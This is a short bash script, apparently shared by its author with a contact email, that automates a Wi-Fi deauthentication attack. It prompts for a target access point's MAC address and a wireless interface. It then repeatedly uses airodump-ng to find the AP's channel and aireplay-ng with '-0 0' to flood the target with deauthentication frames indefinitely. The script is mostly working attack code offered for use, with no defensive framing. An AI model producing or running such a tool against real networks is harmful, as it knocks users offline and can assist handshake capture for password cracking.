#!/bin/bash
#If you have any suggestions, please email me.
#godusevps@gmail.com
#
printf "Enter the MAC address of the AP you want to attack:"
read mac
printf "Enter your device name:"
read device
echo "MAC: $mac"
echo "Device name: $device"
rm -f *cap  *.csv *netxml
while true
	do
		rm -f *cap *.csv *netxml
 		echo "start" 
		xterm -title "dump" -e "airodump-ng $device --bssid $mac -w 1"  & sleep 10;ps -ef | grep "airodump-ng" | awk '{print $2}' |xargs kill -9
		ch=$(cat 1-01.csv | awk 'NR==3{print $6}'|tr -d ',')
		echo $ch
		echo $(date "+%Y-%m-%d %H:%M:%S"' 'ch=$ch)>>log.txt
		rm -f *cap  *.csv *netxml
		xterm -title "dump" -e "airodump-ng $device -c $ch" & sleep 1;ps -ef | grep "airodump-ng" | awk '{print $2}' |xargs kill -9
		xterm -title "attacks" -e "aireplay-ng $device -0 0 -a $mac"
	done
